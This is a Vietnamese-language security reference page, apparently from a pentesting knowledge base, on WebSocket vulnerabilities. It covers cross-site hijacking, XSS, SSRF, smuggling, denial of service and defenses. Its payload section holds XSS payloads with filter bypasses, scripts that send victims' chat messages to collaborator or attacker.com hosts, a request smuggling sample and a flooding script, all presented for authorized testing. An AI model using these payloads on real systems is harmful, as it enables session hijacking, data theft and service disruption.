# WebSocket Vulnerabilities

> Thiếu kiểm tra origin và thông điệp WS không được kiểm chứng cho phép chiếm phiên (hijacking) và injection. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/webshotket.md`](../../../../Troubleshooting_Guide/webshotket.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** A05:2021
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
WebSocket nâng cấp một kết nối HTTP thành một kênh hai chiều, tồn tại lâu dài. Các vấn đề bảo mật chủ
yếu là những lỗi quen thuộc của web — XSS, CSRF, SSRF, vượt xác thực — tái xuất hiện bởi vì cái bắt
tay (handshake) WebSocket và các khung thông điệp (message frame) thường bỏ qua việc kiểm chứng mà
một request thông thường sẽ được hưởng.

## Cơ chế hoạt động (How it works)
Kẻ tấn công kiểm soát cái bắt tay liên-origin và mọi khung thông điệp họ gửi. Ứng dụng sai lầm khi
không kiểm chứng header `Origin` trên lần nâng cấp (khiến cookie của nạn nhân xác thực một socket do
kẻ tấn công khởi tạo — Cross-Site WebSocket Hijacking), khi tin nội dung thông điệp và phản hồi nó
vào DOM (XSS) hoặc vào truy vấn back-end, khi chỉ xác thực một lần lúc kết nối, và khi để máy chủ mở
WebSocket tới các host nội bộ do kẻ tấn công chọn (SSRF) hoặc làm lệch đồng bộ (desync) proxy front-end
(WebSocket smuggling).

## Tác động (Impact)
CSWSH trao toàn quyền đọc/ghi vào phiên đã xác thực của nạn nhân (lịch sử chat, thao tác tài khoản).
XSS reflected/stored qua thông điệp WS dẫn tới đánh cắp phiên và chiếm tài khoản. SSRF chạm tới các
dịch vụ nội bộ; smuggling định tuyến request tới các đường dẫn chỉ-nội-bộ; bí mật trong URL WS rò rỉ
vào log và lịch sử. Mức nghiêm trọng thường là cao — CSWSH và XSS do thông điệp đều làm tổn hại phiên.

## Cách phát hiện (How to detect)
- Phát lại cái bắt tay với `Origin: https://attacker.com` giả mạo; nếu kết nối thành công (không
  `403`/đóng), origin không được kiểm chứng — khả năng cao có CSWSH.
- Gửi HTML/script trong một thông điệp và quan sát xem nó có thực thi khi các client khác kết xuất nó.
- Kiểm tra URL WS và các khung để tìm token/JWT (rò rỉ qua URL) và việc tin tưởng `X-Forwarded-For`.
- `onerror`/`onclose` trên một PoC liên-origin phân biệt một endpoint có kiểm tra origin với một
  endpoint mở (xem PoC chẩn đoán trong phần Payload).
- Trỏ cái bắt tay tới một host/IP nội bộ để dò SSRF do máy chủ khởi tạo.

## Khai thác (tóm tắt) (Exploitation)
Khám phá các socket trong JS của trang, hook `WebSocket` để ghi log các khung, rồi tấn công cái bắt tay:
giả mạo `Origin` để kiểm tra CSWSH và lưu trữ một trang mở socket bằng cookie của nạn nhân rồi rút trộm
các thông điệp nhận được. Chèn payload XSS qua nội dung thông điệp nơi máy chủ phản hồi chúng. Trỏ máy
chủ tới các đích nội bộ để SSRF, hoặc làm lệch đồng bộ proxy để smuggling. Các PoC đầy đủ và kho payload
nằm trong phần Payload và tài liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)

> Được chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Khám phá & quan sát lưu lượng (Discovery & traffic observation)

```bash
# find WebSocket usage in source
curl -s https://target.com | grep -iE "websocket|new WS\(|wss://"
curl -s https://target.com/app.js | grep -iE "WebSocket|\.onmessage|\.send\("
```

Hook constructor từ console trình duyệt để ghi log mọi khung và bắt giữ socket cho các lần gửi thủ công:

```javascript
(function () {
  const _WS = window.WebSocket;
  window.WebSocket = function (url, protocols) {
    const ws = new _WS(url, protocols);
    const origSend = ws.send.bind(ws);
    ws.send = function (data) { console.log("[WS SEND]", data); return origSend(data); };
    ws.addEventListener("message", (e) => console.log("[WS RECV]", e.data));
    return ws;
  };
})();
```

### XSS qua thông điệp WebSocket (XSS via WebSocket messages)

Nếu máy chủ phản hồi nội dung thông điệp vào DOM, hãy chèn qua socket — giao thức JSON hoặc văn bản thuần:

```javascript
ws.send(JSON.stringify({ message: "<img src=1 onerror='alert(1)'>" }));
ws.send("<img src=1 onerror='alert(1)'>");
```

Kho payload:

```javascript
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=x onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<script>alert(1)</script>
<style>@keyframes x{}</style><p style="animation:x onanimationstart=alert(1)">
<base href="https://evil.com/"><script>alert(1)</script>
<link rel="preload" href="x"><script>alert(1)</script>
```

### Ma trận vượt bộ lọc (Filter-bypass matrix)

Kết hợp các kỹ thuật này với header `X-Forwarded-For: 1.1.1.1` khi máy chủ chặn theo IP của client.

| Kỹ thuật | Payload | Mô tả |
|-----------|---------|-------------|
| Làm rối chữ hoa/thường | `<iMg sRc=1 oNeRrOr=alert(1)>` | vượt bộ lọc phân biệt hoa thường |
| Thực thể HTML | `<img src=1 onerror&#x3D;alert(1)>` | mã hóa `=` trong tên thuộc tính |
| Null byte | `<img src=1 onerror\x00=alert(1)>` | bộ phân tích dừng ở null |
| Tab/dấu cách | `<img src=1 onerror\t=alert(1)>` | dấu phân tách khoảng trắng |
| Xuống dòng | `<img src=1 onerror\n=alert(1)>` | ngắt tên thuộc tính |
| Dấu gạch chéo phân tách | `<img src=1 onerror/alert(1)>` | `/` thay cho `=` |
| Gạch chéo Unicode | `<img src=x/onerror=alert(1)>` | fullwidth U+FF0F |
| Biến thể SVG | `<svg/onload=alert(1)>` | sink thay thế |
| Mutation XSS | nhiều polyglot | gây nhầm lẫn cho bộ phân tích DOM |

### Cross-Site WebSocket Hijacking (CSWSH)

Khi `Origin` không được kiểm chứng, cookie đã xác thực của nạn nhân đi cùng cái bắt tay liên-origin. Lưu trữ trên một exploit server, kích hoạt lịch sử, và rút trộm:

```html
<script>
  var ws = new WebSocket("wss://YOUR-LAB-ID.web-security-academy.net/chat");
  ws.onopen = () => ws.send("READY");           // triggers chat history
  ws.onmessage = (event) => {
    fetch("https://YOUR-COLLABORATOR-URL", { method: "POST", mode: "no-cors", body: event.data });
  };
</script>
```

Biến thể rút trộm tự lưu trữ (không dùng Collaborator) đẩy mỗi thông điệp tới một endpoint ghi log:

```html
<script>
  var ws = new WebSocket("wss://YOUR-LAB-ID.web-security-academy.net/chat");
  ws.onopen = () => ws.send("READY");
  ws.onmessage = (event) => {
    fetch("https://YOUR-EXPLOIT-SERVER/log?d=" + encodeURIComponent(event.data), { mode: "no-cors" });
  };
</script>
```

PoC chẩn đoán — `onerror`/`onclose` phân biệt một endpoint có kiểm tra Origin với một endpoint mở:

```html
<script>
  const log = (m) => document.body.innerHTML += "<pre>" + JSON.stringify(m) + "</pre>";
  const ws = new WebSocket("wss://TARGET/chat");
  ws.onopen   = () => { log("Connected!"); ws.send("READY"); };
  ws.onmessage = (e) => log("Received: " + e.data);
  ws.onerror   = (e) => log("Error — Origin likely checked: " + e);
  ws.onclose   = (e) => log("Closed: code=" + e.code);
</script>
```

### Thao túng cái bắt tay (Handshake manipulation)

```http
GET /chat HTTP/1.1
Host: target.com
X-Forwarded-For: 1.1.1.1          # spoof IP if X-Forwarded-For is trusted
Origin: https://attacker.com       # if connection succeeds, Origin not checked
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==   # should be random per connection
```

Tự động hóa việc chèn header bằng mitmproxy (`mitmproxy -s mitm_ws_header.py`):

```python
from mitmproxy import http

def websocket_start(flow: http.HTTPFlow):
    flow.request.headers["X-Forwarded-For"] = "1.1.1.1"
    flow.request.headers["Origin"] = "https://attacker.com"
```

### Gửi ở cấp giao thức (Protocol-level sends)

```javascript
ws.send("Hello world");                                              // plain text
ws.send(JSON.stringify({ type: "message", content: "<img src=x onerror=alert(1)>" }));
ws.send("msg1"); ws.send("msg2"); ws.send("msg3");                   // burst
ws.send(new Uint8Array([0x00, 0x01, 0x02]));                         // binary
ws.send("\x89\x01");                                                 // ping frame (opcode 0x9)
```

### SSRF qua WebSocket (SSRF via WebSocket)

```javascript
var ws = new WebSocket("ws://192.168.1.1:8080/internal-ws");
ws.onmessage = (e) => fetch("https://attacker.com/?d=" + btoa(e.data));

var ws = new WebSocket("ws://localhost:80");        // smuggle HTTP over WS
ws.onopen = () => ws.send("GET /admin HTTP/1.1\r\n\r\n");
```

### WebSocket smuggling

Làm lệch đồng bộ front-end để định tuyến một request bị lén chèn tới các đường dẫn chỉ-nội-bộ:

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: keep-alive, Upgrade
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### Từ chối dịch vụ (Denial of service)

```python
import asyncio, websockets

async def flood():
    async with websockets.connect('wss://target.com/chat') as ws:
        while True:
            await ws.send("A" * 65535)   # max-size frames
            await asyncio.sleep(0.001)

asyncio.run(flood())
```

### Rò rỉ token qua URL (Token leakage via URL)

Bí mật trong URL WS rò rỉ vào log truy cập của proxy/CDN/máy chủ, lịch sử trình duyệt, và header Referer:

```http
wss://target.com/chat?token=SECRET_JWT_HERE
```

## Phòng chống (Defenses)
1. **Kiểm chứng header `Origin`** trên cái bắt tay theo danh sách cho phép (và dùng token CSRF trong
   request nâng cấp) để chặn CSWSH; không bao giờ chỉ dựa vào cookie cho danh tính của socket.
2. **Xem mọi thông điệp là đầu vào không tin cậy** — kiểm chứng/mã hóa khi xuất để vô hiệu XSS, và dùng
   truy vấn tham số hóa cho mọi dữ liệu thông điệp chạm tới back-end.
3. **Tái xác thực và tái phân quyền theo từng thông điệp/hành động**, không chỉ lúc kết nối; dùng token
   thời hạn ngắn trong payload bắt tay, không bao giờ đặt trong URL.
4. **Giới hạn các đích WebSocket do máy chủ khởi tạo** (danh sách cho phép host/scheme, chặn dải nội bộ)
   để ngăn SSRF, và chuẩn hóa/kiểm chứng các request nâng cấp để chặn smuggling.
5. Dùng `wss://` (TLS), áp giới hạn kích thước khung và tốc độ thông điệp để giảm thiểu DoS, và giữ bí
   mật ngoài URL WS.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=WebSocket+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=WebSocket+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=WebSocket+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=WebSocket+Vulnerabilities
- **OSV** — https://osv.dev/list?q=WebSocket+Vulnerabilities
- **Cộng đồng** — r/netsec, blog bảo mật của hãng, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `WebSocket Vulnerabilities <sản phẩm> <phiên bản>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- _Lớp kinh điển: Cross-Site WebSocket Hijacking — thiếu kiểm chứng `Origin` trên lần nâng cấp. Được
  ghi nhận bởi nghiên cứu của PortSwigger và tái hiện trong nhiều advisory sản phẩm/bug-bounty (ví dụ
  các nền tảng chat và cộng tác chấp nhận cái bắt tay liên-origin)._
- _Sự cố kinh điển: rò rỉ token-trong-URL-WS — JWT/session token đặt trong query string `wss://` rò rỉ
  qua log truy cập của proxy, CDN, và máy chủ; một phát hiện thực tế lặp đi lặp lại._
- _Lớp kinh điển: WebSocket request smuggling — lệch đồng bộ front-end/back-end trên cái bắt tay
  `Upgrade` định tuyến các request bị lén chèn tới các đường dẫn chỉ-nội-bộ (HTTP/1.1 keep-alive +
  chunked)._

## Tham khảo (References)
- PortSwigger Web Security Academy — WebSocket security & Cross-Site WebSocket Hijacking.
- OWASP — Testing WebSockets (WSTG) và hướng dẫn bảo mật HTML5 / WebSocket.
- RFC 6455 — The WebSocket Protocol (đặc biệt là các phần `Origin` và cái bắt tay).
